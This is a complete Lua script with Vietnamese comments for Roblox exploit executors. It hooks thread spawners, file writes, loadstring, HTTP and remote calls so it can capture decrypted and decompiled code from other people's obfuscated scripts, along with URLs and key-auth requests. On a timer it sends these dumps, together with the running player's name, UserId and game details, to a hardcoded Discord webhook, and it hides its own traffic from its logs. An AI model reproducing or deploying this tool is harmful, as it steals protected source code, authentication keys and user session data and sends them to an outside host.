--[[
    =============================================================================
    =  EXECUTOR WORKSPACE & RUNTIME DECRYPTION LISTENER / DUMPER (ROBLOX)       =
    =                                                                           =
    =  NGUYÊN LÝ HOẠT ĐỘNG:                                                     =
    =   Khi bất kỳ script nào (kể cả Obfuscate nặng như Luraph, Moonsec, PSU)   =
    =   chạy trên Executor, chúng BẮT BUỘC phải qua giai đoạn GIẢI MÃ và trả     =
    =   kết quả (Hàm, Chuỗi, Luồng thực thi) vào Workspace của Executor.       =
    =                                                                           =
    =  CÁC ĐIỂM CHẶN & THU THẬP DỮ LIỆU ĐÃ GIẢI MÃ:                             =
    =   1. THREAD SPAWN & DEFERRED TRAP (Bắt hàm sau khi giải mã):              =
    =      - Hook `task.spawn`, `task.defer`, `coroutine.wrap`, `coroutine.create`=
    =      - Khi script giải mã xong và khởi chạy luồng chính (Main Loop/Farm/UI)=
    =        hệ thống sẽ lập tức tóm lấy Closure gốc trước khi nó kịp xóa dấu vết=
    =   2. RECURSIVE PROTO & CLOSURE DUMP (Trích xuất cây hàm con):             =
    =      - Đào sâu toàn bộ `debug.getprotos`, `debug.getupvalues`, constants   =
    =      - Tự động gọi `decompile(closure)` hoặc tạo bản tái cấu trúc mã nguồn =
    =   3. EXECUTOR WORKSPACE FILESYSTEM MONITOR (Bắt file ghi vào Workspace): =
    =      - Hook `writefile`, `appendfile`, `makefolder` của executor           =
    =      - Bắt trọn mọi config, cache, script phụ ghi vào thư mục workspace   =
    =   4. ENVIRONMENT & METAMETHOD TAP (Bắt tương tác thực thi):               =
    =      - Bắt toàn bộ biến toàn cục `getgenv()`, `_G` được sinh ra           =
    =      - Bắt toàn bộ Game Service & Remote được truy cập sau khi giải mã    =
    =============================================================================
--]]

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  CẤU HÌNH HỆ THỐNG (CONFIGURATION)                                       ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local CONFIG = {
    -- Link Discord Webhook nhận dữ liệu
    WebhookUrl = "https://discord.com/api/webhooks/1540764685681299526/mFnSqvWMbpNimmzJ4d2w9oJdMvZxDis8hHQVNjlBCNVWIpZTm2nnDC90M87LZ-m6T-to",
    
    -- Tự động gửi về Webhook sau mỗi X giây (nếu có dữ liệu mới)
    AutoSendInterval = 25, 
    AutoSendEnabled = true,

    -- Bật/tắt các tầng lắng nghe giải mã
    TrapThreadSpawners = true,   -- Bắt hàm khi gọi task.spawn/defer/coroutine (Giai đoạn hậu giải mã)
    MonitorWorkspaceFiles = true,-- Bắt mọi file ghi/đọc vào thư mục workspace của Executor
    DeepProtoExtraction = true,  -- Đào sâu cây hàm con (Protos, Upvalues, Constants)
    AttemptDecompile = true,     -- Tự động decompile hàm nếu executor hỗ trợ decompile()
    SniffLoadstring = true,      -- Bắt loadstring động
    SniffHttpRequest = true,     -- Bắt link tải mã nguồn thô qua HTTP
    SniffRemotes = true,         -- Bắt dữ liệu game remote
    SniffRequire = true,         -- Bắt ModuleScripts

    -- Bỏ qua các function / remote mặc định của hệ thống Roblox để chỉ tập trung vào script người dùng
    FilterSystemFunctions = true,
    FilterRobloxDefaultRemotes = true
}

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  TƯƠNG THÍCH MÔI TRƯỜNG EXECUTOR                                          ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local httpRequest = (syn and syn.request)
    or (http and http.request)
    or (fluxus and fluxus.request)
    or (delta and delta.request)
    or request
    or http_request
    or (getgenv and getgenv().request)

local hook_function = hookfunction or replaceclosure or (hookfunc and hookfunc)
local hook_metamethod = hookmetamethod
local get_namecall_method = getnamecallmethod or get_namecall_method
local check_caller = checkcaller or check_caller or function() return false end
local get_gc = getgc or debug.getgc
local get_genv = getgenv or function() return _G end
local clone_func = clonefunction or function(f) return f end
local is_closure = isluau or isexecutorclosure or isourclosure or checkcaller or function() return false end
local decompile_func = decompile or disassemble

-- Danh sách các chuỗi/remote mặc định thường gây spam
local DEFAULT_IGNORED_REMOTES = {
    "CharacterLoaded", "GetServerVersion", "UpdateMousePosition",
    "Ping", "Pong", "Heartbeat", "AnimationTrack", "TouchInterest"
}

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  KHO LƯU TRỮ DỮ LIỆU ĐÃ THU THẬP ĐƯỢC (DATA STORAGE)                     ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local SniffedData = {
    SessionInfo = {
        PlaceId = game.PlaceId,
        GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown",
        JobId = game.JobId,
        StartTime = os.date("!%Y-%m-%d %H:%M:%SZ"),
        LocalPlayer = game.Players.LocalPlayer and game.Players.LocalPlayer.Name or "Unknown",
        UserId = game.Players.LocalPlayer and game.Players.LocalPlayer.UserId or 0,
        Executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
    },
    DecryptedClosures = {},      -- Các hàm được giải mã và nạp vào task.spawn/coroutine
    WorkspaceFiles = {},         -- File được ghi vào executor workspace/ (writefile, appendfile)
    CapturedLoadstrings = {},    -- Toàn bộ loadstring được gọi
    CapturedHttpRequests = {},   -- Link script thô, API, key auth
    CapturedRemoteCalls = {},    -- Remote call payload
    CapturedModules = {},        -- ModuleScripts
    GlobalVariables = {},        -- getgenv() & _G variables
    MemoryDumps = {}             -- Dumps từ getgc
}

local stats = {
    decryptedClosuresCount = 0,
    workspaceFilesCount = 0,
    loadstringsCount = 0,
    httpCount = 0,
    remotesCount = 0,
    modulesCount = 0,
    totalDispatched = 0
}

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  HỖ TRỢ SERIALIZATION JSON & FORMAT                                       ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local function safeToString(val)
    local ok, res = pcall(function()
        if typeof(val) == "Instance" then
            return string.format("<Instance:%s (%s)>", val.Name, val.ClassName)
        elseif typeof(val) == "Vector3" then
            return string.format("Vector3(%.2f, %.2f, %.2f)", val.X, val.Y, val.Z)
        elseif typeof(val) == "CFrame" then
            local pos = val.Position
            return string.format("CFrame(%.2f, %.2f, %.2f)", pos.X, pos.Y, pos.Z)
        elseif typeof(val) == "Color3" then
            return string.format("Color3(%.2f, %.2f, %.2f)", val.R, val.G, val.B)
        elseif typeof(val) == "EnumItem" then
            return tostring(val)
        elseif typeof(val) == "function" then
            local info = debug.getinfo and debug.getinfo(val) or {}
            return string.format("<Function: %s (%s)>", info.name or "anon", info.source or "unknown")
        else
            return tostring(val)
        end
    end)
    return ok and res or "<Unserializable Object>"
end

local function escapeJsonString(s)
    if type(s) ~= "string" then s = safeToString(s) end
    return s:gsub('\\', '\\\\')
            :gsub('"', '\\"')
            :gsub('\n', '\\n')
            :gsub('\r', '\\r')
            :gsub('\t', '\\t')
            :gsub('[%c]', function(c) return ('\\u%04X'):format(c:byte()) end)
end

local function serializeToTable(obj, depth, maxDepth, seen)
    depth = depth or 1
    maxDepth = maxDepth or 4
    seen = seen or {}

    if depth > maxDepth then return "<Max Depth Exceeded>" end

    local t = type(obj)
    if t == "table" then
        if seen[obj] then return "<Circular Reference>" end
        seen[obj] = true

        local result = {}
        local isArray = true
        local maxIdx = 0

        for k, _ in pairs(obj) do
            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                isArray = false
            end
            if type(k) == "number" and k > maxIdx then
                maxIdx = k
            end
        end

        if isArray and maxIdx > 0 then
            for i = 1, maxIdx do
                table.insert(result, serializeToTable(obj[i], depth + 1, maxDepth, seen))
            end
        else
            for k, v in pairs(obj) do
                result[safeToString(k)] = serializeToTable(v, depth + 1, maxDepth, seen)
            end
        end
        return result
    elseif t == "userdata" or typeof(obj) == "Instance" or typeof(obj) == "Vector3" or typeof(obj) == "CFrame" then
        return safeToString(obj)
    elseif t == "function" then
        local info = debug.getinfo and debug.getinfo(obj) or {}
        return {
            Type = "function",
            Name = info.name or "anonymous",
            Source = info.source or "unknown",
            Params = info.numparams or 0
        }
    else
        return obj
    end
end

local function jsonEncode(v)
    local t = type(v)
    if v == nil then return "null"
    elseif t == "boolean" then return v and "true" or "false"
    elseif t == "number" then
        if v ~= v or v == math.huge or v == -math.huge then return "null" end
        return tostring(v)
    elseif t == "string" then return '"' .. escapeJsonString(v) .. '"'
    elseif t == "table" then
        local isArray, maxIdx = true, 0
        for k in pairs(v) do
            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                isArray = false; break
            end
            if k > maxIdx then maxIdx = k end
        end
        if isArray then
            local parts = {}
            for i = 1, maxIdx do
                table.insert(parts, jsonEncode(v[i]))
            end
            return "[" .. table.concat(parts, ",") .. "]"
        else
            local parts = {}
            for k, val in pairs(v) do
                table.insert(parts, '"' .. escapeJsonString(safeToString(k)) .. '":' .. jsonEncode(val))
            end
            return "{" .. table.concat(parts, ",") .. "}"
        end
    else
        return '"' .. escapeJsonString(safeToString(v)) .. '"'
    end
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  HÀM TRÍCH XUẤT CÂY PROTO, CONSTANTS & DECOMPILE HÀM ĐÃ GIẢI MÃ           ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local seen_extracted_funcs = {}

local function extractFunctionProtos(func, currentDepth, maxDepth)
    currentDepth = currentDepth or 1
    maxDepth = maxDepth or 4
    if type(func) ~= "function" or currentDepth > maxDepth then return nil end

    local info = debug.getinfo and debug.getinfo(func) or {}
    local src = info.source or ""
    local name = info.name or ""

    -- Bỏ qua hàm hệ thống nếu bật bộ lọc
    if CONFIG.FilterSystemFunctions then
        if string.find(src, "CoreGui") or string.find(src, "CorePackages") or string.find(src, "PlayerScripts") then
            return nil
        end
    end

    local constants = debug.getconstants and debug.getconstants(func) or {}
    local upvalues = debug.getupvalues and debug.getupvalues(func) or {}
    local protos = (CONFIG.DeepProtoExtraction and debug.getprotos and debug.getprotos(func)) or {}

    local constantsList = {}
    for idx, c in pairs(constants) do
        table.insert(constantsList, safeToString(c))
    end

    local upvaluesList = {}
    for idx, u in pairs(upvalues) do
        table.insert(upvaluesList, {
            Index = idx,
            Value = safeToString(u)
        })
    end

    local nestedProtos = {}
    if CONFIG.DeepProtoExtraction and #protos > 0 then
        for pIdx, pFunc in ipairs(protos) do
            local pData = extractFunctionProtos(pFunc, currentDepth + 1, maxDepth)
            if pData then
                table.insert(nestedProtos, pData)
            end
        end
    end

    local decompiledCode = nil
    if CONFIG.AttemptDecompile and decompile_func then
        pcall(function()
            local decomp = decompile_func(func)
            if decomp and type(decomp) == "string" and #decomp > 0 then
                decompiledCode = (#decomp > 4000) and (decomp:sub(1, 4000) .. "\n... [TRUNCATED DUE TO SIZE] ...") or decomp
            end
        end)
    end

    return {
        Name = name ~= "" and name or ("proto_L" .. currentDepth),
        Source = src,
        NumParams = info.numparams or 0,
        IsVararg = info.is_vararg or false,
        Constants = constantsList,
        Upvalues = upvaluesList,
        ChildProtosCount = #nestedProtos,
        ChildProtos = nestedProtos,
        DecompiledSource = decompiledCode
    }
end

local function captureDecryptedClosure(func, callerContext)
    if type(func) ~= "function" then return end
    if seen_extracted_funcs[func] then return end
    seen_extracted_funcs[func] = true

    local protoTree = extractFunctionProtos(func, 1, 4)
    if protoTree and (#protoTree.Constants > 0 or #protoTree.Upvalues > 0 or #protoTree.ChildProtos > 0) then
        stats.decryptedClosuresCount = stats.decryptedClosuresCount + 1
        
        if #SniffedData.DecryptedClosures >= 80 then
            table.remove(SniffedData.DecryptedClosures, 1)
        end

        table.insert(SniffedData.DecryptedClosures, {
            Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            CallerContext = callerContext or "Unknown Spawner",
            FunctionData = protoTree
        })
    end
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  BỘ LẮNG NGHE GIAI ĐOẠN GIẢI MÃ & THỰC THI (POST-DECRYPTION INTERCEPTORS) ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝

-- 1. THREAD SPAWNERS TRAP (task.spawn, task.defer, task.delay, coroutine.wrap, coroutine.create)
local function setupThreadSpawnerTraps()
    if not CONFIG.TrapThreadSpawners then return end

    -- Trap task.spawn
    if task and task.spawn and hook_function then
        local old_spawn
        old_spawn = hook_function(task.spawn, function(f, ...)
            pcall(function()
                if type(f) == "function" then
                    captureDecryptedClosure(f, "task.spawn")
                end
            end)
            return old_spawn(f, ...)
        end)
    end

    -- Trap task.defer
    if task and task.defer and hook_function then
        local old_defer
        old_defer = hook_function(task.defer, function(f, ...)
            pcall(function()
                if type(f) == "function" then
                    captureDecryptedClosure(f, "task.defer")
                end
            end)
            return old_defer(f, ...)
        end)
    end

    -- Trap task.delay
    if task and task.delay and hook_function then
        local old_delay
        old_delay = hook_function(task.delay, function(t, f, ...)
            pcall(function()
                if type(f) == "function" then
                    captureDecryptedClosure(f, "task.delay")
                end
            end)
            return old_delay(t, f, ...)
        end)
    end

    -- Trap coroutine.wrap
    if coroutine and coroutine.wrap and hook_function then
        local old_wrap
        old_wrap = hook_function(coroutine.wrap, function(f)
            pcall(function()
                if type(f) == "function" then
                    captureDecryptedClosure(f, "coroutine.wrap")
                end
            end)
            return old_wrap(f)
        end)
    end

    -- Trap coroutine.create
    if coroutine and coroutine.create and hook_function then
        local old_create
        old_create = hook_function(coroutine.create, function(f)
            pcall(function()
                if type(f) == "function" then
                    captureDecryptedClosure(f, "coroutine.create")
                end
            end)
            return old_create(f)
        end)
    end
end

-- 2. EXECUTOR WORKSPACE FILESYSTEM MONITOR (writefile, appendfile, makefolder)
local function setupWorkspaceFilesystemMonitor()
    if not CONFIG.MonitorWorkspaceFiles then return end

    local function logFileOperation(opType, path, content)
        pcall(function()
            stats.workspaceFilesCount = stats.workspaceFilesCount + 1
            local snippet = content
            if type(content) == "string" and #content > 5000 then
                snippet = content:sub(1, 5000) .. "\n... [TRUNCATED CONTENT] ..."
            end

            table.insert(SniffedData.WorkspaceFiles, {
                Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                Operation = opType,
                Path = tostring(path),
                Length = (type(content) == "string") and #content or 0,
                Content = snippet
            })
        end)
    end

    -- Hook writefile
    if writefile and hook_function then
        local old_writefile
        old_writefile = hook_function(writefile, function(path, content, ...)
            logFileOperation("writefile", path, content)
            return old_writefile(path, content, ...)
        end)
    end

    -- Hook appendfile
    if appendfile and hook_function then
        local old_appendfile
        old_appendfile = hook_function(appendfile, function(path, content, ...)
            logFileOperation("appendfile", path, content)
            return old_appendfile(path, content, ...)
        end)
    end

    -- Hook makefolder
    if makefolder and hook_function then
        local old_makefolder
        old_makefolder = hook_function(makefolder, function(folderPath, ...)
            logFileOperation("makefolder", folderPath, "[Folder Created]")
            return old_makefolder(folderPath, ...)
        end)
    end
end

-- 3. LOADSTRING & HTTP SNIFFERS
local function setupStandardSniffers()
    -- Loadstring
    if CONFIG.SniffLoadstring then
        local original_loadstring
        local function custom_loadstring(src, chunkName)
            pcall(function()
                if src and type(src) == "string" and #src > 0 then
                    stats.loadstringsCount = stats.loadstringsCount + 1
                    local snippet = #src > 1000 and (src:sub(1, 1000) .. "\n... [TRUNCATED] ...") or src
                    table.insert(SniffedData.CapturedLoadstrings, {
                        Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                        ChunkName = tostring(chunkName or "anonymous_chunk"),
                        Length = #src,
                        SourceCode = src,
                        Preview = snippet
                    })
                end
            end)
            return original_loadstring(src, chunkName)
        end

        if hook_function and loadstring then
            original_loadstring = hook_function(loadstring, custom_loadstring)
        elseif get_genv().loadstring then
            original_loadstring = get_genv().loadstring
            get_genv().loadstring = custom_loadstring
        end
    end

    -- HTTP Requests
    if CONFIG.SniffHttpRequest then
        local function logRequest(url, method, headers, body)
            pcall(function()
                if not url or type(url) ~= "string" then return end
                if string.find(url, "discord.com/api/webhooks", 1, true) then return end

                stats.httpCount = stats.httpCount + 1
                table.insert(SniffedData.CapturedHttpRequests, {
                    Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                    Url = url,
                    Method = method or "GET",
                    Headers = serializeToTable(headers or {}),
                    Body = (body and type(body) == "string" and #body > 1000) and (body:sub(1, 1000) .. " [TRUNCATED]") or body
                })
            end)
        end

        if hook_metamethod then
            local old_namecall
            old_namecall = hook_metamethod(game, "__namecall", function(self, ...)
                local method = get_namecall_method()
                local args = { ... }
                if (method == "HttpGet" or method == "HttpGetAsync") and type(args[1]) == "string" then
                    logRequest(args[1], "GET", nil, nil)
                elseif (method == "HttpPost" or method == "HttpPostAsync") and type(args[1]) == "string" then
                    logRequest(args[1], "POST", nil, args[2])
                end
                return old_namecall(self, ...)
            end)
        end

        if hook_function and httpRequest then
            local old_http = httpRequest
            hook_function(httpRequest, function(options)
                if type(options) == "table" and options.Url then
                    logRequest(options.Url, options.Method or "GET", options.Headers, options.Body)
                elseif type(options) == "string" then
                    logRequest(options, "GET", nil, nil)
                end
                return old_http(options)
            end)
        end
    end

    -- Remote Calls
    if CONFIG.SniffRemotes and hook_metamethod then
        local old_namecall
        old_namecall = hook_metamethod(game, "__namecall", function(self, ...)
            local method = get_namecall_method()
            local args = { ... }

            if (method == "FireServer" or method == "InvokeServer") and typeof(self) == "Instance" then
                local remoteName = self.Name
                local isIgnored = false
                if CONFIG.FilterRobloxDefaultRemotes then
                    for _, ign in ipairs(DEFAULT_IGNORED_REMOTES) do
                        if string.find(remoteName, ign, 1, true) then
                            isIgnored = true; break
                        end
                    end
                end

                if not isIgnored then
                    stats.remotesCount = stats.remotesCount + 1
                    if #SniffedData.CapturedRemoteCalls > 100 then
                        table.remove(SniffedData.CapturedRemoteCalls, 1)
                    end
                    table.insert(SniffedData.CapturedRemoteCalls, {
                        Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                        RemoteName = remoteName,
                        RemoteClass = self.ClassName,
                        RemotePath = self:GetFullName(),
                        Arguments = serializeToTable(args, 1, 3)
                    })
                end
            end

            return old_namecall(self, ...)
        end)
    end
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  HÀM GỬI FILE DỮ LIỆU VỀ DISCORD WEBHOOK                                  ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local isSending = false
local function sendDumpToWebhook(customTitle)
    if not httpRequest or not CONFIG.WebhookUrl or CONFIG.WebhookUrl == "" then
        return false, "Webhook chưa cấu hình"
    end

    if isSending then return false, "Đang gửi" end
    isSending = true

    -- Cập nhật Global Environment Snapshot trước khi gửi
    local genv = get_genv()
    SniffedData.GlobalVariables = {}
    for k, v in pairs(genv) do
        local keyStr = safeToString(k)
        if not string.find(keyStr, "^_") and keyStr ~= "SniffedData" then
            SniffedData.GlobalVariables[keyStr] = serializeToTable(v, 1, 2)
        end
    end

    local jsonString = jsonEncode(SniffedData)
    local dataSizeKb = math.floor(#jsonString / 1024)
    local fileName = string.format("WorkspaceDecryptedDump_%s_%d.json", game.Players.LocalPlayer and game.Players.LocalPlayer.Name or "Client", os.time())
    local title = customTitle or "🧩 EXECUTOR WORKSPACE DECRYPTED DATA CAPTURE"

    local description = string.format(
        "**Game:** `%s` (ID: `%d`)\n" ..
        "**Player:** `%s`\n" ..
        "**Executor:** `%s`\n" ..
        "**Dung lượng:** `%d KB`\n\n" ..
        "**🧬 Hàm giải mã bắt được (Closures/Protos):** `%d`\n" ..
        "**📂 File ghi vào Workspace Executor:** `%d`\n" ..
        "**📜 Loadstring nạp động:** `%d`\n" ..
        "**🌐 HTTP Requests:** `%d`\n" ..
        "**⚡ Remote Calls:** `%d`\n" ..
        "**Thời gian:** `%s`",
        SniffedData.SessionInfo.GameName,
        SniffedData.SessionInfo.PlaceId,
        SniffedData.SessionInfo.LocalPlayer,
        SniffedData.SessionInfo.Executor,
        dataSizeKb,
        stats.decryptedClosuresCount,
        stats.workspaceFilesCount,
        stats.loadstringsCount,
        stats.httpCount,
        stats.remotesCount,
        os.date("!%Y-%m-%d %H:%M:%S UTC")
    )

    local boundary = "----DecryptedBoundary" .. tostring(os.time()) .. tostring(math.random(10000, 99999))
    local payloadJson = jsonEncode({
        username = "Executor Workspace Decryption Bot",
        avatar_url = "https://i.imgur.com/8Q1qD8s.png",
        embeds = {{
            title = title,
            color = 16753920, -- Bright Orange / Gold
            description = description,
            footer = { text = "Antigravity Post-Decryption Interceptor" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })

    local body = "--" .. boundary .. "\r\n"
        .. 'Content-Disposition: form-data; name="payload_json"' .. "\r\n"
        .. 'Content-Type: application/json' .. "\r\n\r\n"
        .. payloadJson .. "\r\n"
        .. "--" .. boundary .. "\r\n"
        .. 'Content-Disposition: form-data; name="file"; filename="' .. fileName .. '"' .. "\r\n"
        .. 'Content-Type: application/json; charset=utf-8' .. "\r\n\r\n"
        .. jsonString .. "\r\n"
        .. "--" .. boundary .. "--\r\n"

    local success, response = pcall(function()
        return httpRequest({
            Url = CONFIG.WebhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
            },
            Body = body
        })
    end)

    isSending = false
    if success and response and (response.StatusCode == 200 or response.StatusCode == 204) then
        stats.totalDispatched = stats.totalDispatched + 1
        return true
    else
        return false, response and response.StatusCode or "Request Failed"
    end
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  GIAO DIỆN ĐIỀU KHIỂN CLIENT (MODERN GUI)                                 ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local function createDashboardUI()
    local CoreGui = game:GetService("CoreGui")
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "WorkspaceDecryptionListener_UI"
    ScreenGui.ResetOnSpawn = false
    pcall(function() ScreenGui.Parent = CoreGui end)
    if not ScreenGui.Parent then ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") end

    local Main = Instance.new("Frame")
    Main.Size = UDim2.new(0, 390, 0, 275)
    Main.Position = UDim2.new(0.5, -195, 0.05, 0)
    Main.BackgroundColor3 = Color3.fromRGB(15, 17, 23)
    Main.BorderSizePixel = 0
    Main.Active = true
    Main.Draggable = true
    Main.Parent = ScreenGui

    local UICorner = Instance.new("UICorner", Main)
    UICorner.CornerRadius = UDim.new(0, 10)
    local UIStroke = Instance.new("UIStroke", Main)
    UIStroke.Color = Color3.fromRGB(255, 170, 0)
    UIStroke.Thickness = 1.5

    -- Title
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, -20, 0, 28)
    Title.Position = UDim2.new(0, 10, 0, 8)
    Title.BackgroundTransparency = 1
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 12
    Title.TextColor3 = Color3.fromRGB(255, 185, 45)
    Title.Text = "🧬 EXECUTOR WORKSPACE & DECRYPTION SNIFFER"
    Title.Parent = Main

    -- Status Log
    local LogLabel = Instance.new("TextLabel")
    LogLabel.Size = UDim2.new(1, -20, 0, 95)
    LogLabel.Position = UDim2.new(0, 10, 0, 38)
    LogLabel.BackgroundColor3 = Color3.fromRGB(22, 25, 35)
    LogLabel.Font = Enum.Font.Code
    LogLabel.TextSize = 11
    LogLabel.TextColor3 = Color3.fromRGB(220, 225, 230)
    LogLabel.TextXAlignment = Enum.TextXAlignment.Left
    LogLabel.TextYAlignment = Enum.TextYAlignment.Top
    LogLabel.TextWrapped = true
    LogLabel.Parent = Main
    local LogCorner = Instance.new("UICorner", LogLabel)
    LogCorner.CornerRadius = UDim.new(0, 6)

    local function refreshUI()
        LogLabel.Text = string.format(
            " [🧬] Decrypted Closures: %d\n" ..
            " [📂] Workspace Files: %d\n" ..
            " [📜] Loadstrings Sniffed: %d\n" ..
            " [🌐] HTTP Requests: %d\n" ..
            " [⚡] Remotes Intercepted: %d\n" ..
            " [📤] Total Webhook Dispatches: %d",
            stats.decryptedClosuresCount,
            stats.workspaceFilesCount,
            stats.loadstringsCount,
            stats.httpCount,
            stats.remotesCount,
            stats.totalDispatched
        )
    end

    -- Button: Dump & Send Webhook
    local SendBtn = Instance.new("TextButton")
    SendBtn.Size = UDim2.new(1, -20, 0, 38)
    SendBtn.Position = UDim2.new(0, 10, 0, 142)
    SendBtn.BackgroundColor3 = Color3.fromRGB(255, 160, 20)
    SendBtn.TextColor3 = Color3.fromRGB(15, 15, 15)
    SendBtn.Font = Enum.Font.GothamBold
    SendBtn.TextSize = 12
    SendBtn.Text = "📤 DUMP & GỬI DỮ LIỆU ĐÃ GIẢI MÃ VỀ WEBHOOK"
    SendBtn.Parent = Main
    local BtnCorner1 = Instance.new("UICorner", SendBtn)
    BtnCorner1.CornerRadius = UDim.new(0, 6)

    -- Button: Deep Scan Memory GC
    local ScanBtn = Instance.new("TextButton")
    ScanBtn.Size = UDim2.new(1, -20, 0, 34)
    ScanBtn.Position = UDim2.new(0, 10, 0, 186)
    ScanBtn.BackgroundColor3 = Color3.fromRGB(35, 40, 55)
    ScanBtn.TextColor3 = Color3.fromRGB(255, 200, 80)
    ScanBtn.Font = Enum.Font.GothamBold
    ScanBtn.TextSize = 11
    ScanBtn.Text = "🔍 QUÉT SÂU GC & TẤT CẢ PROTOS TRONG RAM"
    ScanBtn.Parent = Main
    local BtnCorner2 = Instance.new("UICorner", ScanBtn)
    BtnCorner2.CornerRadius = UDim.new(0, 6)

    -- Status Bar Text
    local StatusFooter = Instance.new("TextLabel")
    StatusFooter.Size = UDim2.new(1, -20, 0, 30)
    StatusFooter.Position = UDim2.new(0, 10, 0, 230)
    StatusFooter.BackgroundTransparency = 1
    StatusFooter.Font = Enum.Font.Gotham
    StatusFooter.TextSize = 11
    StatusFooter.TextColor3 = Color3.fromRGB(150, 160, 180)
    StatusFooter.Text = "🟢 Đang chặn bắt quá trình giải mã trên Workspace..."
    StatusFooter.Parent = Main

    SendBtn.MouseButton1Click:Connect(function()
        StatusFooter.Text = "⏳ Đang đóng gói và gửi về Webhook..."
        StatusFooter.TextColor3 = Color3.fromRGB(255, 200, 50)
        
        local ok, err = sendDumpToWebhook("🚀 THỦ CÔNG DUMP DỮ LIỆU GIẢI MÃ")
        if ok then
            StatusFooter.Text = "✅ Đã gửi thành công gói dữ liệu về Webhook!"
            StatusFooter.TextColor3 = Color3.fromRGB(80, 230, 120)
        else
            StatusFooter.Text = "⚠️ Gửi thất bại: " .. tostring(err)
            StatusFooter.TextColor3 = Color3.fromRGB(255, 80, 80)
        end
        refreshUI()
    end)

    ScanBtn.MouseButton1Click:Connect(function()
        StatusFooter.Text = "🔍 Đang quét sâu GC và trích xuất cây Protos..."
        StatusFooter.TextColor3 = Color3.fromRGB(255, 200, 80)
        task.wait(0.1)
        if get_gc then
            local count = 0
            for _, obj in ipairs(get_gc(true)) do
                if type(obj) == "function" then
                    captureDecryptedClosure(obj, "GC_Deep_Scan")
                    count = count + 1
                end
            end
            StatusFooter.Text = string.format("✅ Quét xong: Đã phân tích %d hàm trong GC!", count)
            StatusFooter.TextColor3 = Color3.fromRGB(80, 230, 120)
        else
            StatusFooter.Text = "⚠️ Executor không hỗ trợ getgc!"
            StatusFooter.TextColor3 = Color3.fromRGB(255, 80, 80)
        end
        refreshUI()
    end)

    task.spawn(function()
        while true do
            refreshUI()
            task.wait(1.5)
        end
    end)
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  VÒNG LẶP TỰ ĐỘNG GỬI ĐỊNH KỲ (AUTO-DISPATCH LOOP)                        ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local function startAutoFlushLoop()
    if not CONFIG.AutoSendEnabled then return end

    task.spawn(function()
        while true do
            task.wait(CONFIG.AutoSendInterval)
            local hasNewData = (stats.decryptedClosuresCount > 0 
                or stats.workspaceFilesCount > 0 
                or stats.loadstringsCount > 0 
                or stats.httpCount > 0 
                or stats.remotesCount > 0)

            if hasNewData and not isSending then
                sendDumpToWebhook("⏱️ BÁO CÁO TỰ ĐỘNG (AUTO-FLUSH)")
            end
        end
    end)
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  KHỞI ĐỘNG HỆ THỐNG                                                       ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local function initialize()
    setupThreadSpawnerTraps()
    setupWorkspaceFilesystemMonitor()
    setupStandardSniffers()
    createDashboardUI()
    startAutoFlushLoop()
    print("[WorkspaceListener] Đã kích hoạt hệ thống chặn bắt giải mã trên Executor Workspace thành công!")
end

initialize()
